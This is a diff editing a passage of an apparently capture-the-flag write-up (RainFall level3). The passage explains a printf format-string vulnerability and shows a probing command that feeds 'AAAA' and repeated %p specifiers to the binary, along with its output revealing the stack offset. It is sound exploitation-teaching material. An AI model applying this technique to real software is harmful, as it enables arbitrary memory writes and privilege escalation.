@@ -35,8 +35,9 @@ End of assembler dump.
 
 ```
 
-We can see that the variable `m` correspond to the address `0x804988c`. There is an exploit regarding `printf` that can make anyone write any value in a given address.
+We can see that the variable `m` corresponds to the address `0x804988c`. There is an exploit regarding `printf` that can make anyone write any value in a given address.
 To do so, we first need to find how many bytes we need to skip to gather the given input, to be clear :
+
 >level3@RainFall:~$ cat <(python -c 'print "AAAA " + "%p " * 10') - | ./level3 
 >AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 
 
